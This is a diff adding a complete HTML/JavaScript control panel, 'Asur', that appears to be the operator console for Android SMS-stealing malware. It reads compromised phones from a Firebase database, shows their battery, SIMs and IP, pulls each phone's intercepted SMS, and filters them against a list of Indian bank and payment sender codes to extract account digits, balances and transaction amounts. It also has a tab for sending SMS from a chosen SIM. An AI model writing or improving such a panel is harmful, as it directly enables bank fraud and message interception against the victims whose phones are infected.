@@ -1,0 +1,1108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Asur — Device Management Console</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#0a0a0f;color:#fff;min-height:100vh;overflow-x:hidden}
+:root{
+  --bg:#0a0a0f; --card:#131318; --card2:#1a1a22; --border:#22222c;
+  --red:#ff2d4f; --red-dark:#c8103a; --green:#22c55e; --yellow:#f59e0b;
+  --grey:#888; --grey2:#555; --mono:'SF Mono',Consolas,monospace;
+}
+button{font-family:inherit;cursor:pointer;border:none;outline:none}
+input{font-family:inherit;outline:none}
+.screen{display:none;min-height:100vh}
+.screen.active{display:block}
+
+/* ═══ LOGIN ═══ */
+#login-screen{display:flex;align-items:center;justify-content:center;padding:24px;background:radial-gradient(circle at top,#2a0812 0%,#0a0a0f 60%)}
+.login-box{width:100%;max-width:380px}
+.login-logo{width:80px;height:80px;background:linear-gradient(135deg,#ff2d4f,#c8103a);border-radius:20px;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:40px;font-weight:900;color:#fff;box-shadow:0 10px 40px rgba(255,45,79,.5)}
+.login-title{font-size:32px;font-weight:800;text-align:center;letter-spacing:2px;margin-bottom:4px}
+.login-title span{color:var(--red)}
+.login-sub{font-size:12px;text-align:center;color:var(--grey);letter-spacing:2px;text-transform:uppercase;margin-bottom:36px}
+.login-card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:24px}
+.login-card h3{font-size:15px;color:var(--grey);text-transform:uppercase;letter-spacing:1px;margin-bottom:16px}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:11px;color:var(--grey);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px}
+.field input{width:100%;padding:14px;background:#0a0a0f;border:1px solid var(--border);border-radius:10px;color:#fff;font-size:14px}
+.field input:focus{border-color:var(--red)}
+.btn-primary{width:100%;padding:15px;background:linear-gradient(135deg,#ff2d4f,#c8103a);color:#fff;border-radius:10px;font-size:15px;font-weight:700;letter-spacing:1px;margin-top:8px;box-shadow:0 6px 20px rgba(255,45,79,.4)}
+.btn-primary:active{transform:scale(.98)}
+.login-err{margin-top:12px;color:var(--red);font-size:13px;text-align:center;min-height:18px}
+
+/* ═══ HEADER ═══ */
+.header{position:sticky;top:0;background:rgba(10,10,15,.95);backdrop-filter:blur(10px);border-bottom:1px solid var(--border);padding:12px 16px;z-index:50}
+.header-row1{display:flex;align-items:center;gap:12px;margin-bottom:10px}
+.hdr-logo{width:36px;height:36px;background:linear-gradient(135deg,#ff2d4f,#c8103a);border-radius:9px;display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:900;flex-shrink:0;box-shadow:0 4px 12px rgba(255,45,79,.4)}
+.hdr-brand{font-size:20px;font-weight:800;letter-spacing:3px;flex:1}
+.hdr-brand span{color:var(--red)}
+.status-pill{display:flex;align-items:center;gap:6px;background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.3);padding:6px 12px;border-radius:20px;font-size:11.5px;color:var(--green);font-weight:600}
+.status-dot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.header-row2{display:flex;gap:8px}
+.search-box{flex:1;position:relative}
+.search-box input{width:100%;padding:10px 12px 10px 36px;background:var(--card);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px}
+.search-box::before{content:'🔍';position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:13px;opacity:.5}
+.time-pill{background:var(--card);border:1px solid var(--border);padding:10px 12px;border-radius:10px;font-size:12px;color:var(--grey);display:flex;align-items:center;gap:6px;font-family:var(--mono)}
+.logout-btn{background:var(--card);border:1px solid var(--border);color:var(--grey);padding:10px 12px;border-radius:10px;font-size:12px;display:flex;align-items:center;gap:6px}
+.logout-btn:active{background:var(--card2)}
+.hdr-back{background:none;color:#fff;font-size:22px;padding:4px 8px;margin-right:4px}
+.hdr-title{font-size:15px;font-weight:700;font-family:var(--mono);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.hdr-delete{background:rgba(255,45,79,.15);color:var(--red);border-radius:8px;padding:8px 10px;font-size:16px}
+
+/* ═══ STATS ═══ */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border-bottom:1px solid var(--border)}
+.stat-cell{background:var(--bg);padding:14px 8px;text-align:center}
+.stat-label{font-size:9.5px;color:var(--grey);letter-spacing:1.2px;text-transform:uppercase;margin-bottom:6px}
+.stat-val{font-size:22px;font-weight:800;font-family:var(--mono)}
+.stat-val.green{color:var(--green)}
+.stat-val.red{color:var(--red)}
+.stat-val.grey{color:var(--grey)}
+
+/* ═══ FILTERS ═══ */
+.filters{padding:12px 16px;display:flex;flex-wrap:wrap;gap:8px;border-bottom:1px solid var(--border)}
+.chip{background:var(--card);border:1px solid var(--border);color:var(--grey);padding:7px 14px;border-radius:20px;font-size:12.5px;font-weight:600;letter-spacing:.5px}
+.chip.active{background:linear-gradient(135deg,#ff2d4f,#c8103a);color:#fff;border-color:var(--red);box-shadow:0 4px 12px rgba(255,45,79,.35)}
+.chip.blue.active{background:linear-gradient(135deg,#3b82f6,#1d4ed8);border-color:#3b82f6;box-shadow:0 4px 12px rgba(59,130,246,.35)}
+.refresh-btn{position:fixed;bottom:24px;right:20px;width:52px;height:52px;border-radius:50%;background:linear-gradient(135deg,#ff2d4f,#c8103a);color:#fff;font-size:22px;display:flex;align-items:center;justify-content:center;box-shadow:0 8px 24px rgba(255,45,79,.5);z-index:40}
+.refresh-btn:active{transform:scale(.92)}
+.refresh-btn.spin{animation:spin 1s linear infinite}
+@keyframes spin{from{transform:rotate(0)}to{transform:rotate(360deg)}}
+
+/* ═══ DEVICE LIST ═══ */
+.device-list{padding:12px 16px 100px;display:flex;flex-direction:column;gap:12px}
+.device-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:16px;cursor:pointer;transition:border-color .2s}
+.device-card:active{border-color:var(--red)}
+.device-card.offline{opacity:.7}
+.device-head{display:flex;align-items:center;gap:12px;margin-bottom:14px}
+.device-icon{width:42px;height:42px;border-radius:12px;background:rgba(255,45,79,.12);border:1px solid rgba(255,45,79,.3);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.device-icon.online{background:rgba(34,197,94,.12);border-color:rgba(34,197,94,.3)}
+.device-meta{flex:1;min-width:0}
+.device-id{font-size:14.5px;font-weight:700;font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.device-name{font-size:11.5px;color:var(--grey);font-family:var(--mono);margin-top:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.device-star{color:var(--grey2);font-size:16px}
+.device-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px 16px;margin-bottom:12px}
+.dg-cell{}
+.dg-label{font-size:9.5px;color:var(--grey);letter-spacing:1px;text-transform:uppercase;margin-bottom:4px}
+.dg-val{font-size:14px;font-weight:600}
+.dg-val.mono{font-family:var(--mono)}
+.battery-wrap{display:flex;align-items:center;gap:8px}
+.battery-icon{width:24px;height:12px;border:1.5px solid var(--grey);border-radius:3px;position:relative;background:transparent;padding:1.5px}
+.battery-icon::after{content:'';position:absolute;right:-4px;top:3px;width:2.5px;height:6px;background:var(--grey);border-radius:0 1px 1px 0}
+.battery-fill{height:100%;border-radius:1.5px;background:var(--green)}
+.battery-fill.warn{background:var(--yellow)}
+.battery-fill.low{background:var(--red)}
+.battery-pct{font-family:var(--mono);font-weight:700;font-size:14px}
+.battery-pct.low{color:var(--red)}
+.battery-pct.warn{color:var(--yellow)}
+.balance-strip{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);border-radius:10px;padding:10px 12px;display:flex;align-items:center;justify-content:space-between;margin-bottom:10px}
+.balance-name{color:var(--green);font-size:12px;font-weight:700;font-family:var(--mono)}
+.balance-amt{color:#fff;font-size:15px;font-weight:800;font-family:var(--mono)}
+.device-status{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:600}
+.device-status.online{color:var(--green)}
+.device-status.offline{color:var(--grey)}
+.device-status-dot{width:7px;height:7px;border-radius:50%;background:currentColor}
+
+.empty{padding:60px 24px;text-align:center;color:var(--grey)}
+.empty-icon{font-size:48px;margin-bottom:16px;opacity:.3}
+
+/* ═══ DETAIL VIEW ═══ */
+.detail-header{position:sticky;top:0;background:rgba(10,10,15,.97);border-bottom:1px solid var(--border);padding:12px 16px;z-index:50;display:flex;align-items:center;gap:8px}
+.detail-banner{padding:16px;border-bottom:1px solid var(--border)}
+.detail-banner-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap;font-size:13px}
+.detail-status{display:flex;align-items:center;gap:5px;font-weight:600}
+.detail-status.online{color:var(--green)}
+.detail-status.offline{color:var(--grey)}
+.detail-bat{font-family:var(--mono);font-weight:700}
+.detail-bat.low{color:var(--red)}
+.detail-bat.warn{color:var(--yellow)}
+.detail-bank-pill{margin-left:auto;background:rgba(34,197,94,.15);color:var(--green);padding:4px 10px;border-radius:12px;font-size:11px;font-weight:700}
+.detail-tabs{display:flex;border-bottom:1px solid var(--border);padding:0 8px;background:var(--bg);position:sticky;top:56px;z-index:40;overflow-x:auto}
+.detail-tab{padding:14px 16px;font-size:13px;font-weight:600;color:var(--grey);border-bottom:2px solid transparent;white-space:nowrap;background:none}
+.detail-tab.active{color:#fff;border-bottom-color:var(--red)}
+.detail-content{padding:16px 16px 100px}
+
+.info-list{background:var(--card);border:1px solid var(--border);border-radius:14px;overflow:hidden}
+.info-row{display:flex;justify-content:space-between;align-items:center;padding:14px 16px;border-bottom:1px solid var(--border);font-size:13.5px}
+.info-row:last-child{border-bottom:none}
+.info-row .k{color:var(--grey);font-size:12.5px;letter-spacing:.5px}
+.info-row .v{font-family:var(--mono);font-weight:600;text-align:right;color:#ddd}
+.info-row .v.blank{color:var(--grey2)}
+.info-section-title{font-size:11px;letter-spacing:1.5px;color:var(--grey);text-transform:uppercase;margin:20px 0 10px;padding-left:4px}
+
+.sms-list{display:flex;flex-direction:column;gap:10px}
+.sms-card{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--red);border-radius:12px;padding:14px}
+.sms-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.sms-sender{font-size:12.5px;font-weight:700;color:var(--red);font-family:var(--mono)}
+.sms-time{font-size:11px;color:var(--grey);font-family:var(--mono)}
+.sms-body{font-size:13px;line-height:1.5;color:#ccc;word-break:break-word}
+
+.bank-summary{background:linear-gradient(135deg,rgba(34,197,94,.12),rgba(34,197,94,.03));border:1px solid rgba(34,197,94,.25);border-radius:14px;padding:18px;margin-bottom:16px}
+.bank-sum-label{font-size:10px;color:var(--green);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:8px}
+.bank-sum-amt{font-size:30px;font-weight:900;font-family:var(--mono);color:#fff}
+.bank-sum-acct{color:var(--green);font-size:13px;font-family:var(--mono);margin-left:8px}
+.bank-card{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--green);border-radius:12px;padding:14px;margin-bottom:10px}
+.bank-card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
+.bank-card-name{font-size:14px;font-weight:700;color:var(--green)}
+.bank-card-acct{font-size:11px;color:var(--grey);font-family:var(--mono)}
+.bank-card-label{font-size:10px;color:var(--grey);letter-spacing:1.2px;text-transform:uppercase;margin:10px 0 4px}
+.bank-card-bal{font-size:22px;font-weight:900;font-family:var(--mono);color:#fff}
+.bank-card-txn{font-size:13px;font-weight:700;font-family:var(--mono)}
+.bank-card-txn.credit{color:var(--green)}
+.bank-card-txn.debit{color:var(--red)}
+.bank-card-msg{font-size:11.5px;color:var(--grey);line-height:1.5;margin-top:10px;padding-top:10px;border-top:1px solid var(--border)}
+
+/* ═══ SEND TAB ═══ */
+.send-sim-row{display:flex;gap:10px;margin-bottom:16px}
+.send-sim-btn{flex:1;padding:14px;background:var(--card);border:1px solid var(--border);border-radius:12px;color:var(--grey);font-size:14px;font-weight:700;font-family:var(--mono);letter-spacing:1px}
+.send-sim-btn.active{background:linear-gradient(135deg,#ff2d4f,#c8103a);color:#fff;border-color:var(--red);box-shadow:0 4px 16px rgba(255,45,79,.4)}
+.send-field{margin-bottom:14px}
+.send-field label{display:block;font-size:11px;color:var(--grey);letter-spacing:1.2px;text-transform:uppercase;margin-bottom:6px}
+.send-field input,.send-field textarea{width:100%;padding:14px;background:var(--card);border:1px solid var(--border);border-radius:12px;color:#fff;font-size:14px}
+.send-field textarea{resize:vertical;min-height:110px;font-family:inherit;line-height:1.5}
+.send-field input:focus,.send-field textarea:focus{border-color:var(--red)}
+.send-char{text-align:right;font-size:11px;color:var(--grey);margin-top:4px;font-family:var(--mono)}
+.btn-send{width:100%;padding:16px;background:linear-gradient(135deg,#ff2d4f,#c8103a);color:#fff;border-radius:12px;font-size:16px;font-weight:700;letter-spacing:.5px;margin-top:8px;box-shadow:0 8px 24px rgba(255,45,79,.4);display:flex;align-items:center;justify-content:center;gap:10px}
+.btn-send:active{transform:scale(.98)}
+.btn-send:disabled{opacity:.5;box-shadow:none}
+.send-note{text-align:center;font-size:12px;color:var(--grey);margin-top:12px;font-family:var(--mono)}
+.send-toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:#1a1a22;border:1px solid var(--border);padding:14px 22px;border-radius:12px;font-size:13.5px;font-weight:600;z-index:200;opacity:0;pointer-events:none;transition:opacity .3s;box-shadow:0 10px 30px rgba(0,0,0,.5)}
+.send-toast.show{opacity:1}
+.send-toast.ok{color:var(--green);border-color:rgba(34,197,94,.4)}
+.send-toast.err{color:var(--red);border-color:rgba(255,45,79,.4)}
+
+/* ═══ SAVED ACCOUNTS ═══ */
+.saved-list{display:flex;flex-direction:column;gap:10px;margin-top:20px}
+.saved-acc{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;display:flex;align-items:center;gap:12px;cursor:pointer}
+.saved-acc:active{border-color:var(--red)}
+.saved-icon{width:36px;height:36px;border-radius:10px;background:var(--card2);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.saved-info{flex:1;min-width:0}
+.saved-url{font-size:13px;font-weight:600;font-family:var(--mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.saved-time{font-size:10.5px;color:var(--grey);font-family:var(--mono);margin-top:2px}
+.saved-del{background:rgba(255,45,79,.15);color:var(--red);width:32px;height:32px;border-radius:9px;font-size:14px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+
+/* ═══ MISC ═══ */
+.toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%);background:var(--card2);padding:12px 20px;border-radius:10px;font-size:13px;z-index:300;opacity:0;pointer-events:none;transition:opacity .3s;border:1px solid var(--border)}
+.toast.show{opacity:1}
+.loading{text-align:center;padding:40px;color:var(--grey)}
+.spinner{display:inline-block;width:32px;height:32px;border:3px solid var(--border);border-top-color:var(--red);border-radius:50%;animation:spin .8s linear infinite;margin-bottom:12px}
+@media(max-width:400px){
+  .stats-grid{grid-template-columns:repeat(2,1fr)}
+  .stat-val{font-size:20px}
+}
+</style>
+</head>
+<body>
+
+<!-- ═══════════ LOGIN SCREEN ═══════════ -->
+<div class="screen active" id="login-screen">
+  <div class="login-box">
+    <div class="login-logo">A</div>
+    <div class="login-title">A<span>sur</span></div>
+    <div class="login-sub">Device Management Console</div>
+
+    <div class="login-card">
+      <h3>New Firebase Account</h3>
+
+      <div class="field">
+        <label>Firebase Database URL</label>
+        <input type="text" id="fb-url" placeholder="https://your-project.firebaseio.com" autocomplete="off" spellcheck="false">
+      </div>
+      <div class="field">
+        <label>Authentication Key / Secret</label>
+        <input type="text" id="fb-secret" placeholder="Your Firebase secret key (optional)" autocomplete="off" spellcheck="false">
+      </div>
+
+      <button class="btn-primary" id="connect-btn">⚡ Save & Connect</button>
+      <div class="login-err" id="login-err"></div>
+    </div>
+
+    <div id="saved-accounts-wrap" style="display:none">
+      <div class="login-sub" style="margin:28px 0 0">Saved Accounts</div>
+      <div class="saved-list" id="saved-list"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════ DASHBOARD ═══════════ -->
+<div class="screen" id="dashboard-screen">
+  <div class="header">
+    <div class="header-row1">
+      <div class="hdr-logo">A</div>
+      <div class="hdr-brand">A<span>SUR</span></div>
+      <div class="status-pill"><span class="status-dot"></span>Connected</div>
+    </div>
+    <div class="header-row2">
+      <div class="search-box"><input type="text" id="search" placeholder="Search"></div>
+      <div class="time-pill">⏰ <span id="clock">--:--</span></div>
+      <button class="logout-btn" id="logout-btn">↪ Logout</button>
+    </div>
+  </div>
+
+  <div class="stats-grid">
+    <div class="stat-cell"><div class="stat-label">Total</div><div class="stat-val" id="st-total">0</div></div>
+    <div class="stat-cell"><div class="stat-label">Online</div><div class="stat-val green" id="st-online">0</div></div>
+    <div class="stat-cell"><div class="stat-label">Offline</div><div class="stat-val grey" id="st-offline">0</div></div>
+    <div class="stat-cell"><div class="stat-label">Bank SMS</div><div class="stat-val red" id="st-bank">0</div></div>
+  </div>
+
+  <div class="filters" id="filters">
+    <button class="chip active" data-filter="all">All</button>
+    <button class="chip" data-filter="online">Online</button>
+    <button class="chip" data-filter="offline">Offline</button>
+    <button class="chip blue" data-filter="bank">Bank</button>
+  </div>
+
+  <div class="device-list" id="device-list"></div>
+  <button class="refresh-btn" id="refresh-btn">↻</button>
+</div>
+
+<!-- ═══════════ DEVICE DETAIL ═══════════ -->
+<div class="screen" id="detail-screen">
+  <div class="detail-header">
+    <button class="hdr-back" id="detail-back">←</button>
+    <div class="hdr-title" id="detail-title">—</div>
+  </div>
+
+  <div class="detail-banner">
+    <div class="detail-banner-row">
+      <div class="detail-status" id="detail-status"><span class="device-status-dot"></span><span>—</span></div>
+      <div style="color:var(--grey);font-size:12px">Bat</div>
+      <div class="detail-bat" id="detail-bat">—</div>
+      <div class="detail-bank-pill" id="detail-bank-pill" style="display:none">0 Bank SMS</div>
+    </div>
+  </div>
+
+  <div class="detail-tabs">
+    <button class="detail-tab active" data-tab="info">Info</button>
+    <button class="detail-tab" data-tab="bank">Bank</button>
+    <button class="detail-tab" data-tab="sms">SMS</button>
+    <button class="detail-tab" data-tab="send">Send</button>
+  </div>
+
+  <div class="detail-content" id="detail-content"></div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════
+   ASUR PANEL — Single-file Device Management Console
+   ═══════════════════════════════════════════════════════════ */
+
+/* ───── State ───── */
+const state = {
+  accounts: [],       // [{url, secret, added, label}]
+  current: null,      // {url, secret}
+  devices: [],        // normalized device objects
+  filter: 'all',
+  search: '',
+  bankCount: 0,
+  currentDevice: null,
+  currentTab: 'info',
+  deviceSms: {},      // devId -> array of SMS
+  deviceBank: {},     // devId -> array of parsed bank SMS
+};
+
+/* ───── Storage ───── */
+const STORE_KEY = 'asur_panel_accounts_v1';
+
+function loadAccounts() {
+  try {
+    state.accounts = JSON.parse(localStorage.getItem(STORE_KEY) || '[]');
+  } catch (e) { state.accounts = []; }
+}
+
+function saveAccounts() {
+  localStorage.setItem(STORE_KEY, JSON.stringify(state.accounts));
+}
+
+/* ───── Utilities ───── */
+function fmtTime(d) {
+  const p = n => String(n).padStart(2, '0');
+  return p(d.getHours()) + ':' + p(d.getMinutes());
+}
+
+function timeAgo(ts) {
+  if (!ts) return '';
+  const diff = Date.now() - ts;
+  if (diff < 60000) return 'now';
+  if (diff < 3600000) return Math.floor(diff/60000) + 'm';
+  if (diff < 86400000) return Math.floor(diff/3600000) + 'h';
+  return Math.floor(diff/86400000) + 'd';
+}
+
+function parseTs(ts) {
+  if (ts == null) return 0;
+  if (typeof ts === 'number') return ts > 1e12 ? ts : ts * 1000;
+  const s = String(ts).trim();
+  if (/^\d+$/.test(s)) {
+    const n = parseInt(s, 10);
+    return n > 1e12 ? n : n * 1000;
+  }
+  // "2026-09-18 23:41:00" or ISO
+  const d = new Date(s.replace(' ', 'T'));
+  if (!isNaN(d.getTime())) return d.getTime();
+  return 0;
+}
+
+function esc(s) {
+  return String(s == null ? '' : s)
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+function toast(msg, cls) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.className = 'toast show ' + (cls || '');
+  setTimeout(() => t.className = 'toast ' + (cls || ''), 2600);
+}
+
+/* ───── Firebase REST ───── */
+function fbUrl(path) {
+  let base = state.current.url.replace(/\/+$/, '');
+  if (!/^https?:\/\//.test(base)) base = 'https://' + base;
+  let url = base + path + '.json';
+  if (state.current.secret) {
+    url += (url.includes('?') ? '&' : '?') + 'auth=' + encodeURIComponent(state.current.secret);
+  }
+  return url;
+}
+
+async function fbGet(path) {
+  try {
+    const r = await fetch(fbUrl(path), { method: 'GET', cache: 'no-store' });
+    if (!r.ok) return null;
+    const t = (await r.text()).trim();
+    if (t === 'null' || !t) return null;
+    return JSON.parse(t);
+  } catch (e) { return null; }
+}
+
+async function fbPut(path, value) {
+  try {
+    const r = await fetch(fbUrl(path), {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(value)
+    });
+    return r.ok;
+  } catch (e) { return false; }
+}
+
+/* ───── Device structure detection ───── */
+function normalizeDevice(id, data) {
+  if (!data || typeof data !== 'object') return null;
+  const meta = data.meta || {};
+
+  // Skip pseudo-devices
+  if (data.phoneNumber === 'sms' || id === 'sms') return null;
+
+  // Last seen
+  const lastSeenRaw =
+    data.lastSeen || data.last_seen || data.lastseen || data.last_online ||
+    data.timestamp || meta.last_seen || meta.lastSeen || null;
+  const lastSeenTs = parseTs(lastSeenRaw);
+
+  // Online determination
+  let online = false;
+  if (lastSeenTs > 0) {
+    online = (Date.now() - lastSeenTs) < 5 * 60 * 1000;
+  } else {
+    online = !!(data.isOnline || data.online || data.connected ||
+      data.status === 'online' || data.status === true);
+  }
+
+  // Battery
+  let battery = null;
+  if (data.battery != null) battery = Number(data.battery);
+  else if (meta.battery != null) battery = Number(meta.battery);
+  else if (data.bat != null) battery = Number(data.bat);
+
+  // Device name
+  const name = data.deviceName || data.name ||
+    (meta.model || data.model) ||
+    (data.brand && data.model ? data.brand + ' ' + data.model : '') ||
+    id.substring(0, 16);
+
+  // SIMs
+  let sims = data.sims;
+  if (!Array.isArray(sims)) sims = [];
+  sims = sims.map((s, i) => ({
+    slot: s && s.simSlotIndex != null ? s.simSlotIndex : i,
+    phone: (s && (s.phoneNumber || s.number || s.phone)) || '',
+    carrier: (s && (s.carrierName || s.carrier || s.operator)) || ''
+  }));
+
+  // Phone number
+  let phone = data.phoneNumber || data.phone || data.number || meta.phone || '';
+  if (!phone && sims.length) phone = sims[0].phone;
+
+  // Network
+  const network = data.networkOperator || data.carrier || data.operator ||
+    meta.carrier || (sims[0] ? sims[0].carrier : '');
+
+  return {
+    id, name, online, battery, phone, network, sims,
+    lastSeen: lastSeenRaw,
+    lastSeenTs,
+    android: data.androidV || data.androidVersion || data.sdkVersion || data.sdk || meta.sdk || '',
+    sdk: data.sdk || data.sdkVersion || meta.sdk || '',
+    ip: data.ipAddress || data.ip || '',
+    cpu: data.cpuArch || '',
+    storage: data.storage || null,
+    simCount: data.simCount != null ? data.simCount : sims.length,
+    raw: data
+  };
+}
+
+/* ───── Load devices ───── */
+async function loadDevices() {
+  const list = document.getElementById('device-list');
+  list.innerHTML = '<div class="loading"><div class="spinner"></div><div>Loading devices...</div></div>';
+
+  // Try multiple known structures
+  const candidates = ['/clients', '/devices', '/users', '/sessions', '/apps'];
+  let found = null;
+  let rootPath = null;
+
+  for (const path of candidates) {
+    const ids = await fbGet(path);
+    if (ids && typeof ids === 'object' && Object.keys(ids).length > 0) {
+      // Check if entries look like devices (have lastSeen/battery/sims/name)
+      const firstKey = Object.keys(ids)[0];
+      const sample = ids[firstKey];
+      if (sample && typeof sample === 'object' && (
+        sample.lastSeen || sample.last_seen || sample.lastseen ||
+        sample.isOnline != null || sample.battery != null ||
+        sample.sims || sample.deviceName || sample.model ||
+        sample.meta || sample.timestamp
+      )) {
+        found = ids;
+        rootPath = path;
+        break;
+      }
+    }
+  }
+
+  if (!found) {
+    list.innerHTML = `<div class="empty"><div class="empty-icon">📱</div><div>No devices found</div><div style="font-size:12px;margin-top:8px;opacity:.6">Checked /clients, /devices, /users, /sessions, /apps</div></div>`;
+    updateStats([]);
+    return;
+  }
+
+  const ids = Object.keys(found);
+  const devices = [];
+
+  // Fetch each device (parallel, batched)
+  for (let i = 0; i < ids.length; i += 10) {
+    const batch = ids.slice(i, i + 10);
+    const promises = batch.map(async id => {
+      const data = await fbGet(rootPath + '/' + id);
+      const dev = normalizeDevice(id, data);
+      return dev;
+    });
+    const results = await Promise.all(promises);
+    results.forEach(r => { if (r) devices.push(r); });
+  }
+
+  state.devices = devices;
+  await computeBankCounts();
+  updateStats(devices);
+  renderDeviceList();
+}
+
+/* ───── Bank SMS detection ───── */
+const BANK_SENDER_RE = /^[A-Z]{2}-([A-Z]+)[- ]/;
+const BANK_SENDER_ALT_RE = /^([A-Z]{2,})[- ]?(S|T|P|B)$/;
+
+function isBankSender(sender) {
+  if (!sender) return false;
+  const s = sender.toUpperCase();
+  // Standard format like VM-HDFCBK, AD-CANBNK, JK-CANBNK-S
+  if (BANK_SENDER_RE.test(s)) return true;
+  // Common bank codes
+  const bankCodes = ['HDFC','SBI','ICICI','AXIS','KOTAK','PNB','BOB','CANARA','CANBNK',
+    'UNION','IDBI','YES','INDUSIND','FEDERAL','RBL','IDFC','BANDHAN','JIO','AIRTEL',
+    'VI','VODAFONE','BSNL','PAYTM','PHONEPE','GPAY','AMEX','BOBSMS','CBSSBI','SBIINB',
+    'ATMSBI','UCO','CENTBK','IOB','BOI','ALLAHABAD','VIJAYA','DENA','JK','KBL','CUB',
+    'SOUTH','KARUR','TMB','DHAN','NAINITAL','KVB','CSB','DCB','TJSB'];
+  for (const code of bankCodes) {
+    if (s.includes(code)) return true;
+  }
+  return false;
+}
+
+function parseBankSms(sms) {
+  const body = sms.body || '';
+  const out = {
+    sender: sms.sender || sms.from || '',
+    body,
+    time: sms.time || sms.at || sms.date || '',
+    account: null,
+    balance: null,
+    txnAmount: null,
+    txnType: null,
+    bank: null
+  };
+  
+  // Extract bank name from sender
+  const m = (out.sender || '').match(/^[A-Z]{2}-([A-Z]+)/);
+  if (m) out.bank = m[1];
+
+  // Extract account last 4 digits — patterns:
+  // A/c XX1234, A/c *1234, Acct XXXX22861, A/c no. XX5728, Acct *4761
+  let acctMatch = body.match(/(?:A\/c|Acct|Account|A\/C)\s*(?:no\.?\s*)?([X*]+(\d{3,6}))/i);
+  if (!acctMatch) {
+    acctMatch = body.match(/[X*]{2,}(\d{3,6})/);
+  }
+  if (acctMatch) {
+    out.account = acctMatch[acctMatch.length - 1];
+  }
+
+  // Balance
+  let balMatch = body.match(/(?:Bal|Balance|Available Bal(?:ance)?|Avl Bal|Available Balance)\s*[:.]?\s*(?:INR|Rs\.?|₹)?\s*([\d,]+\.?\d*)/i);
+  if (balMatch) {
+    out.balance = parseFloat(balMatch[1].replace(/,/g, ''));
+  }
+
+  // Transaction amount + type
+  let txnMatch = body.match(/(?:Rs\.?|INR|₹)\s*([\d,]+\.?\d*)\s*(Dr|Cr|Debited|Credited|debited|credited)/i);
+  if (!txnMatch) {
+    txnMatch = body.match(/(Dr|Cr)\.?\s*(?:Rs\.?|INR|₹)?\s*([\d,]+\.?\d*)/i);
+    if (txnMatch) {
+      out.txnAmount = parseFloat(txnMatch[2].replace(/,/g, ''));
+      out.txnType = txnMatch[1].toLowerCase().startsWith('d') ? 'debit' : 'credit';
+    }
+  } else {
+    out.txnAmount = parseFloat(txnMatch[1].replace(/,/g, ''));
+    out.txnType = txnMatch[2].toLowerCase().startsWith('d') ? 'debit' : 'credit';
+  }
+
+  // Alternative: Dr. INR 1,500.00 pattern
+  if (out.txnAmount == null) {
+    const m2 = body.match(/(?:Dr|Cr)\.?\s*(?:INR|Rs\.?|₹)\s*([\d,]+\.?\d*)/i);
+    if (m2) {
+      out.txnAmount = parseFloat(m2[1].replace(/,/g, ''));
+      out.txnType = body.toLowerCase().includes('dr.') ? 'debit' : 'credit';
+    }
+  }
+
+  return out;
+}
+
+async function computeBankCounts() {
+  let total = 0;
+  for (const dev of state.devices) {
+    const smsList = await fbGet('/clients/' + dev.id + '/sms');
+    if (!smsList || typeof smsList !== 'object') { state.deviceSms[dev.id] = []; continue; }
+    const arr = Object.values(smsList).map(s => ({
+      sender: s.from || s.sender || '',
+      body: s.body || s.message || '',
+      at: s.at || s.time || s.date || '',
+    }));
+    arr.sort((a, b) => parseTs(b.at) - parseTs(a.at));
+    state.deviceSms[dev.id] = arr;
+
+    const bankArr = [];
+    for (const sms of arr) {
+      if (isBankSender(sms.sender) && (sms.body.match(/Bal|Balance|Debited|Credited|Dr\.|Cr\./i))) {
+        const parsed = parseBankSms(sms);
+        if (parsed.balance != null || parsed.txnAmount != null) {
+          bankArr.push(parsed);
+        }
+      }
+    }
+    state.deviceBank[dev.id] = bankArr;
+    total += bankArr.length;
+  }
+  state.bankCount = total;
+}
+
+/* ───── Stats ───── */
+function updateStats(devices) {
+  const total = devices.length;
+  const online = devices.filter(d => d.online).length;
+  const offline = total - online;
+  document.getElementById('st-total').textContent = total;
+  document.getElementById('st-online').textContent = online;
+  document.getElementById('st-offline').textContent = offline;
